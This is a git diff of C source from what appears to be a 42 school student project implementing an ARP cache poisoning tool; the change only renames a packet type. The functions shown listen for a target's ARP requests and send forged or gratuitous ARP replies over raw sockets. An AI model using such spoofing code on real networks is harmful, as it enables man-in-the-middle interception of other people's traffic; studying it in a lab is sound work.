@@ -6,7 +6,7 @@
 /*   By: vgoncalv <vgoncalv@student.42sp.org.br>    +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2024/06/21 16:21:24 by vgoncalv          #+#    #+#             */
-/*   Updated: 2024/06/27 19:34:39 by vgoncalv         ###   ########.fr       */
+/*   Updated: 2024/06/28 11:02:42 by vgoncalv         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -67,7 +67,7 @@ int	poison_bind_interface(t_poison *poison)
 }
 
 
-static int	is_poison_target(t_poison *poison, t_arp *packet)
+static int	is_poison_target(t_poison *poison, t_arp_packet *packet)
 {
 	if (ft_memcmp(poison->target.mac, packet->ar_sha, ETHER_ADDR_LEN) != 0)
 		return (0);
@@ -80,16 +80,16 @@ static int	is_poison_target(t_poison *poison, t_arp *packet)
 
 int	poison_listen(t_poison *poison)
 {
-	ssize_t	read;
-	t_arp	packet;
+	ssize_t			read;
+	t_arp_packet	packet;
 
-	ft_bzero(&packet, sizeof(t_arp));
+	ft_bzero(&packet, sizeof(t_arp_packet));
 	printf("Listening for ARP packets\n");
 	while (1)
 	{
 		if (g_received_signal != 0)
 			return (1);
-		read = recvfrom(poison->iface.sock_fd, &packet, sizeof(t_arp), MSG_DONTWAIT, NULL, NULL);
+		read = recvfrom(poison->iface.sock_fd, &packet, sizeof(t_arp_packet), MSG_DONTWAIT, NULL, NULL);
 		if (read == -1 && errno != EAGAIN && errno != EWOULDBLOCK)
 		{
 			error("Failed to read ARP packet: %s", strerror(errno));
@@ -110,7 +110,7 @@ int	poison_attack(t_poison *poison)
 {
 	int					res;
 	struct sockaddr_ll	addr;
-	t_arp				packet;
+	t_arp_packet		packet;
 
 	if (poison->gratuitous)
 		packet = create_gratuitous_arp_broadcast(&poison->source);
@@ -122,7 +122,7 @@ int	poison_attack(t_poison *poison)
 	addr.sll_halen = ETHER_ADDR_LEN;
 	addr.sll_protocol = htons(ETH_P_ARP);
 	ft_memcpy(addr.sll_addr, poison->target.mac, ETHER_ADDR_LEN);
-	res = sendto(poison->iface.sock_fd, &packet, sizeof(t_arp), 0,
+	res = sendto(poison->iface.sock_fd, &packet, sizeof(t_arp_packet), 0,
 			  (struct sockaddr *)&addr, sizeof(struct sockaddr_ll));
 	if (res == -1)
 	{
